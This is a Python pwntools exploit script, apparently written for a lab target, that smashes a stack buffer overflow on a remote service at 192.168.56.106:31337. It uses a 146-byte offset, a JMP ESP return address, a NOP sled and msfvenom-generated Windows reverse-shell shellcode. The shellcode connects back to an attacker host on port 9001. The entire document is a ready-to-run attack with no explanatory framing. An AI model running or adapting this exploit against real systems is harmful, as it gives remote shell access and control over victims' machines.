from pwn import *

#VICTIM : 192.168.56.106:31337
#IP ATTACKER : 192.168.56.103
#LISTENER on 9001

print('Open a listener on port 9001')

offset = 146
padding = b'A' * offset

eip = p32(0x080414C3) #JMP ESP
#eip = p32(0xdeadbeef)

nops = b'\x90' * 16


# msfvenom -p windows/shell_reverse_tcp LHOST=192.168.56.103 LPORT=9001 -f python -b '\x00\x0a'
buf =  b""
buf += b"\xb8\xd6\x99\xaf\xe3\xdb\xde\xd9\x74\x24\xf4\x5b"
buf += b"\x31\xc9\xb1\x52\x83\xc3\x04\x31\x43\x0e\x03\x95"
buf += b"\x97\x4d\x16\xe5\x40\x13\xd9\x15\x91\x74\x53\xf0"
buf += b"\xa0\xb4\x07\x71\x92\x04\x43\xd7\x1f\xee\x01\xc3"
buf += b"\x94\x82\x8d\xe4\x1d\x28\xe8\xcb\x9e\x01\xc8\x4a"
buf += b"\x1d\x58\x1d\xac\x1c\x93\x50\xad\x59\xce\x99\xff"
buf += b"\x32\x84\x0c\xef\x37\xd0\x8c\x84\x04\xf4\x94\x79"
buf += b"\xdc\xf7\xb5\x2c\x56\xae\x15\xcf\xbb\xda\x1f\xd7"
buf += b"\xd8\xe7\xd6\x6c\x2a\x93\xe8\xa4\x62\x5c\x46\x89"
buf += b"\x4a\xaf\x96\xce\x6d\x50\xed\x26\x8e\xed\xf6\xfd"
buf += b"\xec\x29\x72\xe5\x57\xb9\x24\xc1\x66\x6e\xb2\x82"
buf += b"\x65\xdb\xb0\xcc\x69\xda\x15\x67\x95\x57\x98\xa7"
buf += b"\x1f\x23\xbf\x63\x7b\xf7\xde\x32\x21\x56\xde\x24"
buf += b"\x8a\x07\x7a\x2f\x27\x53\xf7\x72\x20\x90\x3a\x8c"
buf += b"\xb0\xbe\x4d\xff\x82\x61\xe6\x97\xae\xea\x20\x60"
buf += b"\xd0\xc0\x95\xfe\x2f\xeb\xe5\xd7\xeb\xbf\xb5\x4f"
buf += b"\xdd\xbf\x5d\x8f\xe2\x15\xf1\xdf\x4c\xc6\xb2\x8f"
buf += b"\x2c\xb6\x5a\xc5\xa2\xe9\x7b\xe6\x68\x82\x16\x1d"
buf += b"\xfb\x6d\x4e\x25\x9c\x05\x8d\x55\x41\xff\x18\xb3"
buf += b"\xef\xef\x4c\x6c\x98\x96\xd4\xe6\x39\x56\xc3\x83"
buf += b"\x7a\xdc\xe0\x74\x34\x15\x8c\x66\xa1\xd5\xdb\xd4"
buf += b"\x64\xe9\xf1\x70\xea\x78\x9e\x80\x65\x61\x09\xd7"
buf += b"\x22\x57\x40\xbd\xde\xce\xfa\xa3\x22\x96\xc5\x67"
buf += b"\xf9\x6b\xcb\x66\x8c\xd0\xef\x78\x48\xd8\xab\x2c"
buf += b"\x04\x8f\x65\x9a\xe2\x79\xc4\x74\xbd\xd6\x8e\x10"
buf += b"\x38\x15\x11\x66\x45\x70\xe7\x86\xf4\x2d\xbe\xb9"
buf += b"\x39\xba\x36\xc2\x27\x5a\xb8\x19\xec\x6a\xf3\x03"
buf += b"\x45\xe3\x5a\xd6\xd7\x6e\x5d\x0d\x1b\x97\xde\xa7"
buf += b"\xe4\x6c\xfe\xc2\xe1\x29\xb8\x3f\x98\x22\x2d\x3f"
buf += b"\x0f\x42\x64"

payload = padding + eip + nops + buf

c = remote('192.168.56.106', 31337)
c.sendline(payload)
c.recv(1024)
